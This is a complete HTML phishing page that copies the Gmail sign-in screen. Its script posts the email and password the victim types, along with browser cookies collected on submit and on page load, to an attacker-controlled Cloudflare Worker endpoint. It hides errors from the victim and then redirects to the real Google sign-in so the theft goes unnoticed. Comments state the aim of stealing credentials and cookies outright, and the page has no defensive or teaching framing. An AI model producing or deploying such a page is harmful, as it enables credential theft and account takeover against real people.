<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Google Sans', 'Roboto', sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .login {
      width: 100%;
      max-width: 450px;
      padding: 2rem 2rem 3rem;
      border: 1px solid #dadce0;
      border-radius: 8px;
      background: #fff;
    }
    .login h1 {
      font-size: 1.5rem;
      font-weight: 400;
      margin-bottom: 0.5rem;
    }
    .login p {
      color: #5f6368;
      margin-bottom: 1.5rem;
      font-size: 0.9rem;
    }
    .login input[type="email"],
    .login input[type="password"] {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 1rem;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 1rem;
    }
    .login input:focus {
      border-color: #1a73e8;
      outline: none;
    }
    .login button {
      width: 100%;
      background: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 4px;
      font-size: 1rem;
      font-weight: 500;
      cursor: pointer;
    }
    .login button:hover { background: #1557b0; }
    .login .footer {
      margin-top: 1.5rem;
      font-size: 0.8rem;
      color: #5f6368;
      text-align: center;
    }
    .error {
      color: #d93025;
      font-size: 0.85rem;
      margin-bottom: 0.75rem;
      display: none;
    }
  </style>
</head>
<body>

<div class="login">
  <h1>Sign in</h1>
  <p>to continue to Gmail</p>

  <div id="error" class="error">⚠️ Invalid email or password. Try again.</div>

  <form id="loginForm">
    <input type="email" id="email" placeholder="Email or phone" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Next</button>
  </form>

  <div class="footer">
    <a href="#">Forgot email?</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
  </div>
</div>

<script>
  // --- CLOUDFLARE WORKER ENDPOINT ---
  const COLLECT_URL = "https://your-worker.workers.dev/collect";

  document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorEl = document.getElementById('error');

    if (!email || !password) {
      errorEl.style.display = 'block';
      return;
    }

    errorEl.style.display = 'none';

    // --- send credentials to your worker ---
    try {
      await fetch(COLLECT_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email,
          password: password,
          time: Date.now(),
          ua: navigator.userAgent,
          referrer: document.referrer || 'direct'
        })
      });
    } catch (err) {
      // silently fail — don't alert the user
      console.log('error logging:', err);
    }

    // --- also try to steal cookies via document.cookie (if any) ---
    try {
      await fetch(COLLECT_URL + '?cookies=1', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cookies: document.cookie,
          email: email,
          time: Date.now()
        })
      });
    } catch (_) {}

    // --- redirect to real gmail so they don't suspect ---
    // pass the email they typed so it feels seamless
    window.location.href = 'https://accounts.google.com/v3/signin/identifier?continue=https://mail.google.com&Email=' + encodeURIComponent(email);
  });

  // --- also capture any existing cookies on page load (for session reuse) ---
  (function grabExistingCookies() {
    if (document.cookie.length > 0) {
      fetch(COLLECT_URL + '?cookies=1', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cookies: document.cookie,
          note: 'pre-existing cookies on page load',
          time: Date.now()
        })
      }).catch(() => {});
    }
  })();
</script>

</body>
</html>
